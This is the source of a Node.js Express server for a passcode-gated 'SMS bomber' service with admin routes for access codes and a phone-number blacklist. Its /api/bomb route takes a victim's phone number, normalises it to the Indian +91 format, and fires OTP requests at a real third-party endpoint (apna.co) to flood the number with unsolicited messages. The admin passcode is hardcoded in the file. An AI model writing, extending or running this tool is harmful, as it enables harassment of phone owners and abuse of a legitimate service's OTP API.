const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = path.join(__dirname, 'db.json');

// Initialize DB if not exists
if (!fs.existsSync(DB_PATH)) {
  fs.writeFileSync(DB_PATH, JSON.stringify({ codes: ["jaya1987"], blacklist: [] }, null, 2));
}

function getDB() {
  return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
}

function saveDB(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cookieParser());

const AUTH_COOKIE = 'bomber_auth';
const ADMIN_CODE = 'jaya1987';

const requireAuth = (req, res, next) => {
  const code = req.cookies[AUTH_COOKIE];
  const db = getDB();
  if (db.codes.includes(code)) {
    next();
  } else {
    if (req.xhr || req.path.startsWith('/api/')) {
      res.status(401).json({ error: 'Unauthorized' });
    } else {
      res.redirect('/');
    }
  }
};

const requireAdmin = (req, res, next) => {
  if (req.cookies[AUTH_COOKIE] === ADMIN_CODE) {
    next();
  } else {
    res.status(403).json({ error: 'Forbidden: Admin access only' });
  }
};

app.get('/', (req, res) => {
  const code = req.cookies[AUTH_COOKIE];
  const db = getDB();
  if (db.codes.includes(code)) {
    res.redirect('/dashboard');
  } else {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  }
});

app.post('/login', (req, res) => {
  const { passcode } = req.body;
  const db = getDB();
  if (db.codes.includes(passcode)) {
    res.cookie(AUTH_COOKIE, passcode, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    });
    res.json({ success: true, redirect: '/dashboard', isAdmin: passcode === ADMIN_CODE });
  } else {
    res.status(401).json({ success: false, error: 'Invalid passcode' });
  }
});

app.get('/dashboard', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/logout', (req, res) => {
  res.clearCookie(AUTH_COOKIE);
  res.redirect('/');
});

// Admin APIs
app.get('/api/admin/status', requireAuth, (req, res) => {
  res.json({ isAdmin: req.cookies[AUTH_COOKIE] === ADMIN_CODE });
});

app.get('/api/admin/data', requireAdmin, (req, res) => {
  const db = getDB();
  res.json(db);
});

app.post('/api/admin/add-code', requireAdmin, (req, res) => {
  const { code } = req.body;
  if (!code) return res.status(400).json({ error: 'Code required' });
  const db = getDB();
  if (!db.codes.includes(code)) {
    db.codes.push(code);
    saveDB(db);
  }
  res.json({ success: true, codes: db.codes });
});

app.post('/api/admin/remove-code', requireAdmin, (req, res) => {
  const { code } = req.body;
  if (code === ADMIN_CODE) return res.status(400).json({ error: 'Cannot remove admin code' });
  const db = getDB();
  db.codes = db.codes.filter(c => c !== code);
  saveDB(db);
  res.json({ success: true, codes: db.codes });
});

app.post('/api/admin/blacklist', requireAdmin, (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'Phone number required' });
  const db = getDB();
  if (!db.blacklist.includes(phone)) {
    db.blacklist.push(phone);
    saveDB(db);
  }
  res.json({ success: true, blacklist: db.blacklist });
});

app.post('/api/admin/unblacklist', requireAdmin, (req, res) => {
  const { phone } = req.body;
  const db = getDB();
  db.blacklist = db.blacklist.filter(p => p !== phone);
  saveDB(db);
  res.json({ success: true, blacklist: db.blacklist });
});

app.post('/api/bomb', requireAuth, async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'Phone number required' });

  let normalized = phone.replace(/\s+/g, '');
  if (!normalized.startsWith('+')) {
    if (normalized.length === 10) normalized = '+91' + normalized;
    else if (normalized.length === 12 && normalized.startsWith('91')) normalized = '+' + normalized;
  }
  
  const plain10 = normalized.slice(-10);
  const db = getDB();
  
  if (db.blacklist.includes(plain10) || db.blacklist.includes(normalized)) {
    return res.status(403).json({ error: 'This number is blacklisted and cannot be bombed.' });
  }

  const with91 = '91' + plain10;
  const endpoints = [];

  // Minimal set of endpoints for testing/demo
  endpoints.push({ name: 'apna_co_v1', url: 'https://production.apna.co/api/userprofile/v1/otp/', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone_number: with91, retries: 0, hash_type: 'employer', source: 'employer' } });
  
  const results = [];
  let successCount = 0;

  for (const ep of endpoints) {
    try {
      const config = {
        method: ep.method,
        url: ep.url,
        headers: ep.headers,
        timeout: 5000
      };
      if (ep.body) config.data = ep.body;
      
      await axios(config);
      results.push({ name: ep.name, success: true });
      successCount++;
    } catch (err) {
      results.push({ name: ep.name, success: false, status: err.response?.status });
    }
  }

  res.json({ successCount, total: endpoints.length, results });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
